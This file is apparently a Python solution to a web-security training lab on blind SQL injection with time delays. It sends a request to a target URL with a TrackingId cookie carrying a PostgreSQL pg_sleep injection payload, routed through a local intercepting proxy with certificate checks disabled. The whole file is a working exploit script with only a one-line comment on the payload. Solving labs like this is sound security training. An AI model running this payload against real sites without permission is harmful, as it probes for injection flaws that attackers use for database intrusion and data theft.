#!/usr/bin/env/[python3]
# -*- coding: utf-8 -*-

import requests
import sys

"""Lab: Blind SQL injection with time delays"""

def exploit(base_url: str) -> None:
    response = requests.get(
        base_url + "/filter",
        cookies={"TrackingId": f"' || (SELECT pg_sleep(10))--"}, #this is the payload, it will sleep for 10 seconds
        proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
        verify=False,
    )


def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>")
        exit(1)
    requests.packages.urllib3.disable_warnings()
    exploit(sys.argv[1].rstrip("/"))


if __name__ == "__main__":
    main()
    